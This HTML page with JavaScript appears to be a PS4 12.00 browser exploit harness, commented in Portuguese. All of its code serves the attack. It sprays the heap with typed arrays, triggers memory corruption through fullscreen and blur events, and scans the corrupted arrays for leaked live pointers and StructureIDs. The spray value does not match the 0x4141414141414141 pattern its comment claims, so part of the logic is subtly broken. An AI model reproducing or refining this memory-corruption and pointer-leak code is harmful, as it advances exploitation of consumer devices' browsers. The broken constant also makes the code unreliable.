<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - Universal Deep Scan</title>
<style>
    body { font-family: sans-serif; background: #f0f0f0; color: #333; padding: 20px; }
    button { padding: 10px 20px; margin: 5px; cursor: pointer; }
    code { background: #e0e0e0; padding: 2px 4px; border-radius: 4px; font-family: monospace; display: block; white-space: pre-wrap; margin: 5px 0; }
    .vuln { color: #d00; font-weight: bold; }
    .pointer { color: #0077ff; font-weight: bold; border: 1px solid #0077ff; padding: 2px; }
    .metadata { color: #00aa00; font-weight: bold; }
    hr { border: 0; border-top: 1px solid #ccc; margin: 20px 0; }
</style>
</head>
<body>

<h1>PS4 12.00 - UNIVERSAL DEEP SCAN</h1>

<h2>STAGE 1: Setup & Corruption</h2>
<button onclick="setup()">1. CREATE ALL ARRAYS</button>
<div id="setup_log"></div>

<script>
var g_arrays = {
    Float64: [], Float32: [], BigUint64: [], BigInt64: [],
    Uint32: [], Int32: [], Uint16: [], Int16: [],
    Uint8: [], Int8: []
};

function setup() {
    const r = document.getElementById('setup_log');
    r.innerHTML = 'Creating arrays (500 per type)...<br>';
    
    // Alocação padronizada para manter o heap layout
    for(let i = 0; i < 500; i++) {
        g_arrays.Float64.push(new Float64Array(8));
        g_arrays.Float32.push(new Float32Array(8));
        g_arrays.BigUint64.push(new BigUint64Array(8));
        g_arrays.BigInt64.push(new BigInt64Array(8));
        g_arrays.Uint32.push(new Uint32Array(16));
        g_arrays.Int32.push(new Int32Array(16));
        g_arrays.Uint16.push(new Uint16Array(32));
        g_arrays.Int16.push(new Int16Array(32));
        g_arrays.Uint8.push(new Uint8Array(64));
        g_arrays.Int8.push(new Int8Array(64));

        // Marca cada array com seu índice original para detecção de corrupção
        for (let type in g_arrays) {
            let a = g_arrays[type][i];
            if (type.includes('Big')) a[0] = BigInt(i);
            else a[0] = i;
        }
    }
    
    r.innerHTML += '<b>Pronto. Pressione OPTIONS duas vezes (Full Screen ativado).</b><br>';
    if(document.documentElement.webkitRequestFullscreen) document.documentElement.webkitRequestFullscreen();
    
    let triggerCount = 0;
    window.onblur = function() {
        triggerCount++;
        r.innerHTML += '<br>Trigger ' + triggerCount + '... ';
        
        // Redução estratégica do spray para evitar apagar metadados
        const P = 2.121995791e-314; // 0x4141414141414141
        const spray = [];
        for(let i = 0; i < 4000; i++) { // Reduzido de 8000
            const s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        if(triggerCount === 2) {
            r.innerHTML += '<b>CORRUPÇÃO FINALIZADA!</b><br>';
            check_corruption_status();
            window.onblur = null;
        }
    };
}

function check_corruption_status() {
    const r = document.getElementById('setup_log');
    for(let type in g_arrays) {
        let corrupted = g_arrays[type].filter((a, idx) => {
            if(type.includes('Big')) return a[0] !== BigInt(idx);
            return a[0] !== idx;
        });
        if(corrupted.length > 0) {
            r.innerHTML += `<span class="vuln">✓ ${type}Array: ${corrupted.length} corrompidos.</span><br>`;
        }
    }
}
</script>

<hr>

<h2>STAGE 2: Universal Deep Dump</h2>
<p>Este scanner busca por qualquer dado que NÃO seja o seu spray (0x4141...).</p>
<button onclick="universal_deep_dump()">2. RUN UNIVERSAL SCAN</button>
<div id="scan_log"></div>

<script>
function universal_deep_dump() {
    const r = document.getElementById('scan_log');
    r.innerHTML = '<b>Iniciando varredura em busca de dados desalinhados...</b><br>';

    let total_found = 0;
    const P_HEX = "4141414141414141"; // Seu padrão de spray

    for (let type in g_arrays) {
        g_arrays[type].forEach((arr, idx) => {
            // Usa BigUint64 para ver a representação bruta de 8 bytes
            let view = new BigUint64Array(arr.buffer, 0, 1);
            let val = view[0];
            let hex = val.toString(16).padStart(16, '0');
            let original_hex = BigInt(idx).toString(16).padStart(16, '0');

            // Critério: Diferente do índice original E diferente do spray E diferente de zero
            if (hex !== original_hex && hex !== "0000000000000000" && hex !== P_HEX) {
                total_found++;
                let style = "";
                let tag = "<b>(DADO ESTRANHO!)</b>";

                // Detecção de Ponteiros 0x7F...
                if (val >= 0x7f0000000000n && val <= 0x7fffffffffffn) {
                    style = "class='pointer'";
                    tag = "<span class='pointer'>(!!! PONTEIRO VIVO !!!)</span>";
                } 
                // Detecção de StructureIDs conhecidos
                else if (hex.endsWith("25") || hex.endsWith("108")) {
                    style = "class='metadata'";
                    tag = "<span class='metadata'>(METADADOS/STRUCTUREID)</span>";
                }

                if (total_found < 100) { // Proteção para não travar o log
                    r.innerHTML += `[${type} #${idx}] ${tag} Content: <code ${style}>0x${hex}</code><br>`;
                }
            }
        });
    }

    if (total_found === 0) {
        r.innerHTML += "Nenhum dado estranho encontrado. Memória está limpa ou dominada pelo spray.<br>";
    } else {
        r.innerHTML += `<br><b>Total de ${total_found} vazamentos de memória identificados!</b>`;
    }
}
</script>

</body>
</html>
